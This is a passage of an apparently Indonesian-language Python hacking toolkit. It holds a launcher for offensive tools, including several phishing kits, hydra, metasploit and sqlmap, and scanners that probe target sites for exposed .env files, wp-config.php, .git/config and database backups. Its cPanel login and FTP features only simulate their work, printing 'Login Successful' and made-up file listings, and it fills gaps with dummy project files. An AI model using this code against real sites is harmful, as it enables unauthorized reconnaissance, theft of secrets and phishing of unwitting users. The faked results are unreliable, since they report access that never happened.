                    subprocess.run(["pip", "install", "-r", requirements_file], check=True)
                
                setup_file = os.path.join(install_dir, "setup.py")
                if os.path.exists(setup_file):
                    self.print_result("Info", f"Menjalankan setup untuk {tool_name}...", "info")
                    subprocess.run(["python", "setup.py", "install"], cwd=install_dir, check=True)
        
        except subprocess.CalledProcessError as e:
            self.print_result("Error", f"Gagal menginstall {tool_name}: {str(e)}", "error")
        except Exception as e:
            self.print_result("Error", f"Error: {str(e)}", "error")

    def run_installed_tools(self):
        """Menu untuk menjalankan tools yang sudah terinstall"""
        while True:
            self.banner()
            print(f"{Colors.CYAN}{Colors.BOLD}Run Installed Tools{Colors.END}")
            
            tools_dir = "tools"
            if not os.path.exists(tools_dir):
                self.print_result("Warning", "Directory tools tidak ditemukan!", "warning")
                print(f"{Colors.YELLOW}Silakan install tools terlebih dahulu.{Colors.END}")
                input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")
                return
            
            # Scan directory tools
            installed_tools = []
            for item in os.listdir(tools_dir):
                tool_path = os.path.join(tools_dir, item)
                if os.path.isdir(tool_path):
                    installed_tools.append(item)
            
            if not installed_tools:
                self.print_result("Warning", "Tidak ada tools yang terinstall!", "warning")
                input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")
                return
            
            # Tampilkan daftar tools yang terinstall
            print(f"{Colors.YELLOW}Tools yang terinstall:{Colors.END}")
            for i, tool in enumerate(installed_tools, 1):
                print(f"{Colors.GREEN}{i}.{Colors.END} {tool}")
            
            print(f"{Colors.GREEN}0.{Colors.END} Kembali ke Menu Utama")
            
            pilihan = input(f"\n{Colors.CYAN}➤ Pilih tools untuk dijalankan [0-{len(installed_tools)}]: {Colors.END}").strip()
            
            if pilihan == "0":
                return
            elif pilihan.isdigit() and 1 <= int(pilihan) <= len(installed_tools):
                selected_tool = installed_tools[int(pilihan) - 1]
                self.run_tool_interface(selected_tool)
            else:
                self.print_result("Error", "Pilihan tidak valid!", "error")
                input(f"\n{Colors.CYAN}Tekan Enter untuk melanjutkan...{Colors.END}")

    def run_tool_interface(self, tool_name):
        """Interface untuk menjalankan tool tertentu"""
        
        tool_dir = f"tools/{tool_name}"
        
        # Common tools dan command mereka
        tool_commands = {
            "sqlmap": "python sqlmap.py -h",
            "zphisher": "bash zphisher.sh",
            "RED_HAWK": "php rhawk.php",
            "HiddenEye": "python3 HiddenEye.py",
            "PhisherMan": "python3 PhisherMan.py",
            "SocialFish": "python3 SocialFish.py",
            "knock": "python knockpy.py",
            "dirb": "./dirb",
            "nmap": "./nmap",
            "metasploit-framework": "./msfconsole",
            "john": "./john",
            "thc-hydra": "./hydra",
            "wpscan": "ruby wpscan.rb",
            "nikto": "perl nikto.pl",
            "aircrack-ng": "./aircrack-ng",
            "recon-ng": "python recon-ng.py",
            "theHarvester": "python theHarvester.py",
            "sherlock": "python sherlock.py",
            "XSStrike": "python xsstrike.py"
        }
        
        self.banner()
        print(f"{Colors.CYAN}{Colors.BOLD}Running: {tool_name}{Colors.END}")
        print(f"{Colors.YELLOW}Directory: {tool_dir}{Colors.END}")
        
        # Cari file executable utama
        main_file = None
        for file in os.listdir(tool_dir):
            if file.endswith(('.py', '.sh', '.pl', '.rb')) or file in [tool_name.lower(), tool_name]:
                if os.path.isfile(os.path.join(tool_dir, file)):
                    main_file = file
                    break
        
        if main_file:
            file_path = os.path.join(tool_dir, main_file)
            print(f"{Colors.GREEN}File utama ditemukan: {main_file}{Colors.END}")
            
            # Buat executable jika perlu
            if main_file.endswith('.sh'):
                os.chmod(file_path, 0o755)
            
            try:
                # Change to tool directory
                original_dir = os.getcwd()
                os.chdir(tool_dir)
                
                # Tampilkan help dulu
                if main_file.endswith('.py'):
                    help_cmd = ["python", main_file, "-h"]
                elif main_file.endswith('.sh'):
                    help_cmd = ["bash", main_file, "-h"]
                else:
                    help_cmd = ["./" + main_file, "-h"]
                
                print(f"\n{Colors.YELLOW}Menjalankan help command...{Colors.END}")
                subprocess.run(help_cmd)
                
                # Input custom command
                print(f"\n{Colors.CYAN}Masukkan command untuk {tool_name} (atau kosongkan untuk keluar):{Colors.END}")
                custom_cmd = input(f"{Colors.CYAN}➤ Command: {Colors.END}").strip()
                
                if custom_cmd:
                    if main_file.endswith('.py'):
                        full_cmd = ["python", main_file] + custom_cmd.split()
                    elif main_file.endswith('.sh'):
                        full_cmd = ["bash", main_file] + custom_cmd.split()
                    else:
                        full_cmd = ["./" + main_file] + custom_cmd.split()
                    
                    print(f"\n{Colors.YELLOW}Menjalankan: {' '.join(full_cmd)}{Colors.END}")
                    subprocess.run(full_cmd)
                
                # Kembali ke directory semula
                os.chdir(original_dir)
                
            except Exception as e:
                self.print_result("Error", f"Gagal menjalankan tool: {str(e)}", "error")
                os.chdir(original_dir)
        else:
            self.print_result("Error", f"File utama untuk {tool_name} tidak ditemukan!", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def cpanel_project_dumper(self):
        """
        Dump project files from cPanel hosting for analysis
        """
        try:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🚀 cPanel PROJECT DUMPER{Colors.END}")
            print(f"{Colors.YELLOW}Tools untuk dump file project dari hosting cPanel{Colors.END}")
            
            while True:
                print(f"\n{Colors.CYAN}{Colors.BOLD}Pilihan Dump Method:{Colors.END}")
                print(f"{Colors.GREEN}1.{Colors.END}  Auto Detect cPanel Structure")
                print(f"{Colors.GREEN}2.{Colors.END}  Manual cPanel Login")
                print(f"{Colors.GREEN}3.{Colors.END}  FTP/SFTP Connection")
                print(f"{Colors.GREEN}4.{Colors.END}  Web Directory Traversal")
                print(f"{Colors.GREEN}5.{Colors.END}  Create Dummy cPanel Project")
                print(f"{Colors.GREEN}6.{Colors.END}  Kembali ke Menu Utama")
                
                method = input(f"\n{Colors.CYAN}➤ Pilih metode [1-6]: {Colors.END}").strip()
                
                if method == "1":
                    self.auto_detect_cpanel_structure()
                elif method == "2":
                    self.manual_cpanel_login()
                elif method == "3":
                    self.ftp_sftp_dump()
                elif method == "4":
                    self.web_directory_traversal()
                elif method == "5":
                    self.create_dummy_cpanel_project()
                elif method == "6":
                    break
                else:
                    self.print_result("Error", "Pilihan tidak valid!", "error")
                    
        except Exception as e:
            self.print_result("Error", f"Terjadi kesalahan: {e}", "error")

    def auto_detect_cpanel_structure(self):
        """
        Automatically detect cPanel structure and common file locations
        """
        try:
            
            target = input(f"{Colors.CYAN}➤ Masukkan URL target (contoh: https://example.com): {Colors.END}").strip()
            
            if not target.startswith(('http://', 'https://')):
                target = 'https://' + target
            
            self.print_result("Info", "Memulai auto-deteksi struktur cPanel...", "info")
            
            # Common cPanel paths
            cpanel_paths = [
                "/cpanel", "/webmail", "/whm", "/admin", "/administrator",
                "/phpmyadmin", "/mysql", "/.cpanel", "/cgi-sys", "/mail",
                "/public_html", "/.well-known", "/.git", "/.env",
                "/wp-admin", "/wp-content", "/wp-includes",  # WordPress
                "/laravel", "/storage", "/vendor", "/resources",  # Laravel
                "/app", "/application", "/system", "/index.php"  # General
            ]
            
            # Common backup and config files
            backup_files = [
                "/backup.zip", "/backup.tar.gz", "/backup.sql",
                "/wp-config.php", "/config.php", "/.env",
                "/database.sql", "/dump.sql", "/backup/database.sql",
                "/.backup", "/backup/", "/sql/backup.sql"
            ]
            
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            found_paths = []
            
            # Test cPanel paths
            self.print_result("Info", "Scanning common cPanel paths...", "info")
            for path in cpanel_paths:
                test_url = urljoin(target, path)
                try:
                    response = session.get(test_url, timeout=10)
                    if response.status_code in [200, 301, 302, 403]:
                        found_paths.append((test_url, response.status_code))
                        self.print_result("Found", f"{test_url} [{response.status_code}]", "success")
                except:
                    pass
            
            # Test backup files
            self.print_result("Info", "Scanning backup files...", "info")
            for backup_file in backup_files:
                test_url = urljoin(target, backup_file)
                try:
                    response = session.get(test_url, timeout=10)
                    if response.status_code == 200:
                        found_paths.append((test_url, response.status_code))
                        self.print_result("Warning", f"BACKUP FOUND: {test_url}", "warning")
                except:
                    pass
            
            # Display results
            if found_paths:
                self.print_result("Success", f"Found {len(found_paths)} accessible paths!", "success")
                
                domain = target.replace('https://', '').replace('http://', '').split('/')[0]
                output_file = f"cpanel_scan_{domain}.txt"
                
                with open(output_file, 'w') as f:
                    f.write(f"cPanel Scan Results for {target}\n")
                    f.write("="*50 + "\n")
                    for url, status in found_paths:
                        f.write(f"{url} [{status}]\n")
                
                self.print_result("Info", f"Results saved to: {output_file}", "info")
            else:
                self.print_result("Error", "No cPanel paths found!", "error")
                
        except Exception as e:
            self.print_result("Error", f"Auto-detection failed: {e}", "error")

    def manual_cpanel_login(self):
        """
        Manual cPanel login and file extraction
        """
        try:
            print(f"\n{Colors.YELLOW}⚠️  Manual cPanel Login Method{Colors.END}")
            print(f"{Colors.RED}Perhatian: Hanya untuk testing dengan izin!{Colors.END}")
            
            target = input(f"{Colors.CYAN}➤ cPanel URL (contoh: https://example.com:2083): {Colors.END}").strip()
            username = input(f"{Colors.CYAN}➤ Username: {Colors.END}").strip()
            password = input(f"{Colors.CYAN}➤ Password: {Colors.END}").strip()
            
            self.print_result("Info", "Mencoba login ke cPanel...", "info")
            
            # Simulate cPanel login (this is just a template - actual implementation would vary)
            cpanel_info = {
                'target': target,
                'username': username,
                'status': 'Simulated Login',
                'files_found': [
                    '/public_html/index.php',
                    '/public_html/wp-config.php',
                    '/public_html/.htaccess',
                    '/public_html/css/style.css',
                    '/public_html/js/app.js'
                ]
            }
            
            self._simulate_cpanel_file_extraction(cpanel_info)
            
        except Exception as e:
            self.print_result("Error", f"Manual login failed: {e}", "error")

    def ftp_sftp_dump(self):
        """
        FTP/SFTP connection to dump files
        """
        try:
            print(f"\n{Colors.YELLOW}📁 FTP/SFTP Connection Method{Colors.END}")
            
            host = input(f"{Colors.CYAN}➤ FTP Host: {Colors.END}").strip()
            username = input(f"{Colors.CYAN}➤ Username: {Colors.END}").strip()
            password = input(f"{Colors.CYAN}➤ Password: {Colors.END}").strip()
            port = input(f"{Colors.CYAN}➤ Port (default 21): {Colors.END}").strip() or "21"
            
            self.print_result("Info", f"Connecting to {host}:{port}...", "info")
            
            # This would be the actual FTP implementation
            # For now, we'll create a simulation
            ftp_structure = self._simulate_ftp_structure(host)
            self._display_ftp_structure(ftp_structure)
            
        except Exception as e:
            self.print_result("Error", f"FTP connection failed: {e}", "error")

    def web_directory_traversal(self):
        """
        Web-based directory traversal and file discovery
        """
        try:
            target = input(f"{Colors.CYAN}➤ Target URL: {Colors.END}").strip()
            
            if not target.startswith(('http://', 'https://')):
                target = 'https://' + target
            
            self.print_result("Info", "Starting web directory traversal...", "info")
            
            # Common files to check in cPanel environments
            common_files = [
                "/.env", "/config.php", "/wp-config.php", 
                "/database.php", "/settings.php",
                "/backup.zip", "/backup.sql", "/dump.sql",
                "/.git/config", "/.htaccess", "/web.config",
                "/phpinfo.php", "/test.php", "/info.php"
            ]
            
            # Common directories
            common_dirs = [
                "/admin/", "/backup/", "/database/", "/sql/",
                "/uploads/", "/images/", "/css/", "/js/",
                "/include/", "/config/", "/tmp/", "/cache/"
            ]

            session = requests.Session()
            
            found_files = []
            
            # Check files
            for file_path in common_files:
                test_url = target.rstrip('/') + file_path
                try:
                    response = session.get(test_url, timeout=8)
                    if response.status_code == 200:
                        found_files.append(("FILE", test_url, len(response.content)))
                        self.print_result("Found", f"File: {test_url} ({len(response.content)} bytes)", "success")
                except:
                    pass
            
            # Check directories
            for dir_path in common_dirs:
                test_url = target.rstrip('/') + dir_path
                try:
                    response = session.get(test_url, timeout=8)
                    if response.status_code in [200, 403, 301, 302]:
                        found_files.append(("DIR", test_url, response.status_code))
                        self.print_result("Found", f"Directory: {test_url} [{response.status_code}]", "info")
                except:
                    pass
            
            if found_files:
                self._save_traversal_results(target, found_files)
            else:
                self.print_result("Error", "No files or directories found!", "error")
                
        except Exception as e:
            self.print_result("Error", f"Directory traversal failed: {e}", "error")

    def create_dummy_cpanel_project(self):
        """
        Create a dummy cPanel project structure for analysis
        """
        try:
            project_name = input(f"{Colors.CYAN}➤ Nama project: {Colors.END}").strip() or "dummy_cpanel_project"
            
            self.print_result("Info", f"Membuat dummy cPanel project: {project_name}", "info")
            
            # Create complete cPanel structure
            structure = {
                'public_html': {
                    'index.php': '<?php echo "Welcome to cPanel"; ?>',
                    '.htaccess': 'Options -Indexes\nRewriteEngine On',
                    'wp-config.php': '<?php define("DB_NAME", "database"); define("DB_USER", "username"); ?>',
                    '.env': 'APP_KEY=base64:xxx\nDB_PASSWORD=secret123',
                    'css': {
                        'style.css': 'body { font-family: Arial; }'
                    },
                    'js': {
                        'app.js': 'console.log("cPanel JS");'
                    },
                    'images': {
                        'logo.png': '',
                        'favicon.ico': ''
                    }
                },
                'etc': {
                    'passwd': 'root:x:0:0:root:/root:/bin/bash',
                    'group': 'root:x:0:'
                },
                'tmp': {
                    'sess_abc123': '',
                    'cache': {}
                },
                'backup': {
                    'database.sql': '-- MySQL dump',
                    'website.tar.gz': ''
                },
                'logs': {
                    'access_log': '127.0.0.1 - GET /index.php',
                    'error_log': '[error] PHP warning'
                }
            }
            
            self._create_dummy_structure(project_name, structure)
            self.print_result("Success", f"Dummy project created: {project_name}", "success")
            
        except Exception as e:
            self.print_result("Error", f"Failed to create dummy project: {e}", "error")

    def _simulate_cpanel_file_extraction(self, cpanel_info):
        """Simulate cPanel file extraction"""
        try:
            print(f"\n{Colors.GREEN}✅ Login Successful!{Colors.END}")
            print(f"{Colors.CYAN}Target:{Colors.END} {cpanel_info['target']}")
            print(f"{Colors.CYAN}User:{Colors.END} {cpanel_info['username']}")
            
            print(f"\n{Colors.YELLOW}📁 File Structure Found:{Colors.END}")
            for i, file_path in enumerate(cpanel_info['files_found'], 1):
                print(f"{Colors.CYAN}{i}.{Colors.END} {file_path}")
            
            dump_dir = f"cpanel_dump_{cpanel_info['username']}"
            os.makedirs(dump_dir, exist_ok=True)
            
            # Create dummy files
            for file_path in cpanel_info['files_found']:
                full_path = os.path.join(dump_dir, file_path.lstrip('/'))
                os.makedirs(os.path.dirname(full_path), exist_ok=True)
                
                # Create file with dummy content based on extension
                if file_path.endswith('.php'):
                    content = '<?php // ' + file_path + ' ?>'
                elif file_path.endswith('.css'):
                    content = '/* ' + file_path + ' */'
                elif file_path.endswith('.js'):
                    content = '// ' + file_path
                else:
                    content = '# ' + file_path
                    
                with open(full_path, 'w') as f:
                    f.write(content)
            
            self.print_result("Success", f"Project dumped to: {dump_dir}", "success")
            
        except Exception as e:
            self.print_result("Error", f"Extraction simulation failed: {e}", "error")

    def _simulate_ftp_structure(self, host):
        """Simulate FTP structure"""
        return {
            'host': host,
            'files': [
                ('/', 'DIR', '0'),
                ('/public_html', 'DIR', '0'),
                ('/public_html/index.php', 'FILE', '1520'),
                ('/public_html/wp-config.php', 'FILE', '320'),
                ('/public_html/.htaccess', 'FILE', '45'),
                ('/public_html/css/style.css', 'FILE', '1200'),
                ('/public_html/js/app.js', 'FILE', '800'),
                ('/backup', 'DIR', '0'),
                ('/backup/database.sql', 'FILE', '5242880'),
                ('/logs', 'DIR', '0'),
                ('/logs/access_log', 'FILE', '1048576')
            ]
        }

    def _display_ftp_structure(self, ftp_structure):
        """Display FTP structure"""
        print(f"\n{Colors.GREEN}📁 FTP Structure for {ftp_structure['host']}:{Colors.END}")
        for file_path, file_type, size in ftp_structure['files']:
            if file_type == 'DIR':
                print(f"{Colors.CYAN}📁 {file_path}{Colors.END}")
            else:
                print(f"{Colors.YELLOW}📄 {file_path} ({size} bytes){Colors.END}")

    def _save_traversal_results(self, target, found_files):
        """Save traversal results to file"""

        domain = target.replace('https://', '').replace('http://', '').split('/')[0]
        output_file = f"web_traversal_{domain}.txt"
        
        with open(output_file, 'w') as f:
            f.write(f"Web Directory Traversal Results for {target}\n")
            f.write("="*60 + "\n\n")
            
            for file_type, path, size in found_files:
                f.write(f"{file_type}: {path}")
                if file_type == "FILE":
                    f.write(f" ({size} bytes)")
                else:
                    f.write(f" [{size}]")
                f.write("\n")
        
        self.print_result("Success", f"Results saved to: {output_file}", "success")

    def _create_dummy_structure(self, base_dir, structure):
        """Create dummy directory structure"""
        
        for name, content in structure.items():
            path = os.path.join(base_dir, name)
            
            if isinstance(content, dict):
                os.makedirs(path, exist_ok=True)
                self._create_dummy_structure(path, content)
            else:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, 'w') as f:
                    f.write(content)

    def view_source_code_complete_analysis(self):
        """
        Complete source code analysis with frontend, backend, and security checks
        """
        try:
            print(f"\n{Colors.CYAN}{Colors.BOLD}[VIEW SOURCE CODE - COMPLETE ANALYSIS]{Colors.END}")
            url = input(f"{Colors.CYAN}➤ Masukkan URL website: {Colors.END}").strip()
            
            if not url:
                self.print_result("Error", "URL tidak boleh kosong!", "error")
                return
            
            # Add protocol if missing
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            
            self.print_result("Info", f"Mengambil source code dari: {url}", "info")
            
            # Make request with headers to mimic real browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            }
            
            response = requests.get(url, headers=headers, timeout=15, verify=False)
            response.raise_for_status()
            
            source_code = response.text
            content_type = response.headers.get('content-type', '').lower()
            
            # Display comprehensive information
            print(f"\n{Colors.GREEN}{Colors.BOLD}📄 INFORMASI RESPONSE:{Colors.END}")
            print(f"{Colors.CYAN}➤ URL:{Colors.END} {url}")
            print(f"{Colors.CYAN}➤ Status Code:{Colors.END} {response.status_code}")
            print(f"{Colors.CYAN}➤ Content-Type:{Colors.END} {content_type}")
            print(f"{Colors.CYAN}➤ Ukuran:{Colors.END} {len(source_code):,} karakter")
            print(f"{Colors.CYAN}➤ Encoding:{Colors.END} {response.encoding}")
            print(f"{Colors.CYAN}➤ Server:{Colors.END} {response.headers.get('server', 'Tidak diketahui')}")
            print(f"{Colors.CYAN}➤ X-Powered-By:{Colors.END} {response.headers.get('x-powered-by', 'Tidak diketahui')}")
            
            # Comprehensive analysis
            self.analyze_frontend_source(source_code, url)
            self.analyze_security_headers(response.headers)
            self.detect_technologies(source_code, response.headers)
            
            # Display options
            self.source_code_display_options(source_code, url, response)
        
        except requests.exceptions.RequestException as e:
            self.print_result("Error", f"Gagal mengambil source code: {str(e)}", "error")
        except Exception as e:
            self.print_result("Error", f"Terjadi kesalahan: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk melanjutkan...{Colors.END}")

    def analyze_frontend_source(self, source_code, url):
        """
        Comprehensive frontend source code analysis
        """
        print(f"\n{Colors.GREEN}{Colors.BOLD}🔍 ANALISIS FRONTEND:{Colors.END}")
        
        lines = source_code.split('\n')
        total_lines = len(lines)
        
        # Basic statistics
        print(f"{Colors.CYAN}📊 STATISTIK DASAR:{Colors.END}")
        print(f"  {Colors.CYAN}•{Colors.END} Jumlah Baris: {total_lines:,}")
        print(f"  {Colors.CYAN}•{Colors.END} Jumlah Karakter: {len(source_code):,}")
        
        # HTML Structure Analysis
        print(f"\n{Colors.CYAN}🏗️  STRUKTUR HTML:{Colors.END}")
        
        # Count important tags
        tags_to_check = {
            'script': 'Script Tags',
            'link': 'CSS Links',
            'style': 'Style Blocks',
            'img': 'Image Tags',
            'form': 'Form Tags',
            'input': 'Input Fields',
            'a': 'Anchor Links',
            'div': 'Div Elements',
            'span': 'Span Elements',
            'table': 'Tables',
            'iframe': 'Iframes',
            'meta': 'Meta Tags'
        }
        
        for tag, description in tags_to_check.items():
            count = source_code.lower().count(f'<{tag}')
            if count > 0:
                print(f"  {Colors.CYAN}•{Colors.END} {description}: {count}")
        
        # Security-related analysis
        print(f"\n{Colors.CYAN}🛡️  ANALISIS KEAMANAN FRONTEND:{Colors.END}")
        
        # Check for sensitive information
        sensitive_patterns = {
            'password fields': ['type="password"', "type='password'"],
            'email fields': ['type="email"', "type='email'"],
            'hidden fields': ['type="hidden"', "type='hidden'"],
            'comments': ['<!--', '//'],
            'javascript events': ['onclick=', 'onload=', 'onsubmit=', 'onerror='],
            'external scripts': ['src="http:', "src='http:"],
            'jquery': ['jquery', '$('],
            'console.log': ['console.log', 'console.debug'],
            'api keys': ['api_key', 'apikey', 'secret', 'token'],
        }
        
        for pattern_name, patterns in sensitive_patterns.items():
            found = any(pattern in source_code.lower() for pattern in patterns)
            if found:
                count = sum(source_code.lower().count(pattern) for pattern in patterns)
                print(f"  {Colors.YELLOW}⚠{Colors.END} {pattern_name.title()}: {count} ditemukan")
        
        # Framework Detection
        print(f"\n{Colors.CYAN}🔧 TEKNOLOGI FRONTEND:{Colors.END}")
        frameworks = {
            'React': ['react', 'react-dom'],
            'Vue.js': ['vue', 'v-model'],
            'Angular': ['angular', 'ng-'],
            'Bootstrap': ['bootstrap', 'btn-primary'],
            'jQuery': ['jquery', '$('],
            'Font Awesome': ['fontawesome', 'fa-'],
            'Google Analytics': ['ga(', 'google-analytics'],
            'GTM': ['gtm', 'googletagmanager'],
        }
        
        for framework, indicators in frameworks.items():
            if any(indicator in source_code.lower() for indicator in indicators):
                print(f"  {Colors.GREEN}✓{Colors.END} {framework}")
        
        # SEO Analysis
        print(f"\n{Colors.CYAN}🔎 ANALISIS SEO:{Colors.END}")
        seo_elements = {
            'Title Tag': ['<title>', '</title>'],
            'Meta Description': ['name="description"', "name='description'"],
            'Meta Keywords': ['name="keywords"', "name='keywords'"],
            'Canonical URL': ['rel="canonical"', "rel='canonical'"],
            'Open Graph Tags': ['property="og:', "property='og:"],
            'Twitter Cards': ['name="twitter:', "name='twitter:"],
            'Structured Data': ['schema.org', 'json-ld'],
            'H1 Tags': ['<h1>', '</h1>'],
        }
        
        for element, patterns in seo_elements.items():
            found = any(pattern in source_code.lower() for pattern in patterns)
            status = f"{Colors.GREEN}✓{Colors.END}" if found else f"{Colors.RED}✗{Colors.END}"
            print(f"  {status} {element}")

    def analyze_security_headers(self, headers):
        """
        Analyze security-related headers
        """
        print(f"\n{Colors.GREEN}{Colors.BOLD}🔐 ANALISIS SECURITY HEADERS:{Colors.END}")
        
        security_headers = {
            'Content-Security-Policy': 'CSP untuk mencegah XSS',
            'X-Frame-Options': 'Mencegah clickjacking',
            'X-Content-Type-Options': 'Mencegah MIME sniffing',
            'Strict-Transport-Security': 'HTTP Strict Transport Security',
            'X-XSS-Protection': 'XSS Protection',
            'Referrer-Policy': 'Kontrol referrer information',
            'Permissions-Policy': 'Permissions Policy',
            'Feature-Policy': 'Feature Policy (legacy)',
        }
        
        for header, description in security_headers.items():
            if header in headers:
                print(f"  {Colors.GREEN}✓{Colors.END} {header}: {headers[header]}")
            else:
                print(f"  {Colors.RED}✗{Colors.END} {header}: Tidak ditemukan")

    def detect_technologies(self, source_code, headers):
        """
        Detect backend and frontend technologies
        """
        print(f"\n{Colors.GREEN}{Colors.BOLD}🛠️  DETEKSI TEKNOLOGI:{Colors.END}")
        
        # Backend technologies
        server = headers.get('server', '').lower()
        x_powered_by = headers.get('x-powered-by', '').lower()
        
        backend_tech = {
            'Apache': 'apache' in server,
            'Nginx': 'nginx' in server,
            'IIS': 'iis' in server,
            'PHP': 'php' in x_powered_by or '.php' in source_code.lower(),
            'ASP.NET': 'asp.net' in x_powered_by or '__viewstate' in source_code,
            'Node.js': 'node.js' in x_powered_by or 'express' in source_code.lower(),
            'Python': 'python' in x_powered_by or 'django' in source_code.lower() or 'flask' in source_code.lower(),
            'Java': 'java' in x_powered_by or 'jsp' in source_code.lower() or 'servlet' in source_code.lower(),
        }
        
        print(f"{Colors.CYAN}🔧 BACKEND:{Colors.END}")
        for tech, detected in backend_tech.items():
            if detected:
                print(f"  {Colors.GREEN}✓{Colors.END} {tech}")

    def source_code_display_options(self, source_code, url, response):
        """
        Display various options for viewing and analyzing source code
        """
        while True:
            print(f"\n{Colors.GREEN}{Colors.BOLD}📋 OPSI ANALISIS SOURCE CODE:{Colors.END}")
            print(f"{Colors.CYAN}1.{Colors.END}  Tampilkan source code lengkap")
            print(f"{Colors.CYAN}2.{Colors.END}  Tampilkan dengan syntax highlighting")
            print(f"{Colors.CYAN}3.{Colors.END}  Simpan ke file")
            print(f"{Colors.CYAN}4.{Colors.END}  Cari kata kunci dalam source")
            print(f"{Colors.CYAN}5.{Colors.END}  Analisis JavaScript")
            print(f"{Colors.CYAN}6.{Colors.END}  Analisis Forms & Input Fields")
            print(f"{Colors.CYAN}7.{Colors.END}  Ekstrak semua URLs")
            print(f"{Colors.CYAN}8.{Colors.END}  Analisis Cookies & Local Storage")
            print(f"{Colors.CYAN}9.{Colors.END}  Deteksi Vulnerability Patterns")
            print(f"{Colors.CYAN}10.{Colors.END} Ambil Asset Laravel")
            print(f"{Colors.CYAN}11.{Colors.END} Kembali ke menu utama")
            
            option = input(f"\n{Colors.CYAN}➤ Pilih opsi [1-11]: {Colors.END}").strip()
            
            if option == "1":
                self.display_full_source_code(source_code, url)
            elif option == "2":
                self.display_source_with_advanced_syntax_highlighting(source_code)
            elif option == "3":
                self.save_source_code_to_file(source_code, url)
            elif option == "4":
                self.search_keywords_in_source(source_code)
            elif option == "5":
                self.analyze_javascript_code(source_code)
            elif option == "6":
                self.analyze_forms_and_inputs(source_code)
            elif option == "7":
                self.extract_all_urls(source_code, url)
            elif option == "8":
                self.analyze_cookies_and_storage(source_code)
            elif option == "9":
                self.detect_vulnerability_patterns(source_code)
            elif option == "10":
                self.extract_laravel_assets(url)
            elif option == "11":
                break
            else:
                self.print_result("Error", "Opsi tidak valid!", "error")

    def extract_laravel_assets(self, base_url):
        """
        Extract all assets from Laravel website including CSS, JS, images, and Laravel-specific files
        Jika tidak bisa mengambil aslinya, buat dummy assets untuk analisis
        """
        try:
         
            self.print_result("Info", "Memulai ekstraksi asset Laravel...", "info")
            
            # Create directory for assets
            domain = urlparse(base_url).netloc
            assets_dir = f"laravel_assets_{domain}"
            os.makedirs(assets_dir, exist_ok=True)
            
            # Coba ekstrak asset real terlebih dahulu
            real_assets = self._extract_real_assets(base_url, assets_dir)
            
            # Jika tidak ada asset real yang ditemukan, buat dummy structure
            if len(real_assets) < 3:
                self.print_result("Info", "Asset real sedikit, membuat struktur Laravel dummy...", "info")
                self._create_laravel_dummy_structure(assets_dir, domain)
            else:
                self.print_result("Success", f"Berhasil mengekstrak {len(real_assets)} asset real", "success")
            
            # Show summary
            self._display_assets_summary(assets_dir)
            
        except Exception as e:
            self.print_result("Error", f"Terjadi kesalahan: {e}", "error")

    def _extract_real_assets(self, base_url, assets_dir):
        """Extract real assets from the website"""
        
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        assets_found = []
        
        try:
            response = session.get(base_url)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract all asset links
            asset_tags = {
                'css': soup.find_all('link', rel='stylesheet'),
                'js': soup.find_all('script', src=True),
                'img': soup.find_all('img', src=True),
            }
            
            # Download assets
            for asset_type, tags in asset_tags.items():
                for tag in tags:
                    src = tag.get('href') or tag.get('src')
                    if src:
                        asset_url = urljoin(base_url, src)
                        if self._download_asset(session, asset_url, assets_dir, asset_type):
                            assets_found.append(asset_url)
                            
        except Exception as e:
            self.print_result("Warning", f"Gagal ekstrak asset real: {e}", "warning")
        
        return assets_found

    def _create_laravel_dummy_structure(self, assets_dir, domain):
        """Create complete Laravel dummy asset structure"""
        try:
            self.print_result("Info", "Membuat struktur Laravel dummy lengkap...", "info")
            
   
            self._create_laravel_config_files(assets_dir, domain)
            
       
            self._create_css_assets(assets_dir)
            
    
            self._create_javascript_assets(assets_dir)
            
   
            self._create_image_assets(assets_dir)
    
            self._create_laravel_specific_assets(assets_dir)
            
            self.print_result("Success", "Struktur Laravel dummy berhasil dibuat!", "success")
            
        except Exception as e:
            self.print_result("Error", f"Gagal membuat dummy structure: {e}", "error")

    def _create_laravel_config_files(self, assets_dir, domain):
        """Create Laravel configuration files"""
        
        # composer.json
        composer_json = {
            "name": f"laravel/laravel-{domain}",
            "type": "project",
            "description": f"Laravel application for {domain}",
            "keywords": ["framework", "laravel"],
            "license": "MIT",
            "require": {
                "php": "^8.1",
                "laravel/framework": "^10.0",
                "laravel/sanctum": "^3.2",
                "laravel/tinker": "^2.8"
            },
            "require-dev": {
                "fakerphp/faker": "^1.9.1",
                "laravel/pint": "^1.0",
                "laravel/sail": "^1.18",
                "mockery/mockery": "^1.4.4",
                "nunomaduro/collision": "^7.0",
                "phpunit/phpunit": "^10.1",
                "spatie/laravel-ignition": "^2.0"
            },
            "autoload": {
                "psr-4": {
                    "App\\": "app/",
                    "Database\\Factories\\": "database/factories/",
                    "Database\\Seeders\\": "database/seeders/"
                }
            },
            "extra": {
                "laravel": {
                    "dont-discover": []
                }
            },
            "config": {
                "optimize-autoloader": True,
                "preferred-install": "dist",
                "sort-packages": True,
                "allow-plugins": {
                    "pestphp/pest-plugin": True,
                    "php-http/discovery": True
                }
            }
        }
        
        with open(os.path.join(assets_dir, "composer.json"), "w") as f:
            json.dump(composer_json, f, indent=2)
        
        # package.json
        package_json = {
            "name": f"laravel-{domain}",
            "private": True,
            "type": "module",
            "scripts": {
                "dev": "vite",
                "build": "vite build",
                "build:production": "vite build --mode=production"
            },
            "devDependencies": {
                "axios": "^1.6.2",
